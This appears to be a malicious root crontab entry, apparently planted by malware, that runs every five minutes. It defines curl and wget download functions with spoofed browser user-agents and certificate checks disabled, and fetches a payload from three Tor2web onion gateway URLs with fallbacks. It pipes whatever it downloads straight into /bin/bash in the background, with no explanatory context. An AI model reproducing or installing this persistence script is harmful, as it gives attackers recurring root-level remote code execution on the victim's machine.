MAILTO=''
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root function
d1(){
   curl --retry 2 --connect-timeout 26 --max-time 75 --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36' -fsSLk $1;
 };

 function d2() {
    wget --tries=2 --connect-timeout=26 --timeout=75 --no-check-certificate --user-agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36' -qO- $1;
  };


u1="https://eknr73utr7u7bzwo.onion.ws/wp-content/J6M86V";
u2="https://eknr73utr7u7bzwo.onion.ly/wp-content/J6M86V";
u3="https://eknr73utr7u7bzwo.tor2web.su/wp-content/J6M86V";

(d1 ${u1}||d1 ${u2}||d1 ${u2}||d2 ${u1}||d2 ${u2}||d2 ${u3})|/bin/bash &
